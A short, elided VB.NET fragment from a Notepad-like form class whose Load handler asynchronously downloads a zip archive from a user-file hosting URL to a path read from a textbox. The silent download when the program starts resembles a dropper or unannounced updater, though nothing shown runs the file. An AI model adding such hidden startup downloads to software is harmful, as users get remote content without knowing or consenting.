...
Public Class Notepad__
    ...
    Private Sub Notepad___Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ...
        download.DownloadFileAsync(New Uri("https://612092f6-6003-49d0-8fe5-2e737d705081.usrfiles.com/archives/612092_f47c0bfcb4804655bd56ab02e2b81db7.zip"), Texbbb.TextBox11.Text)
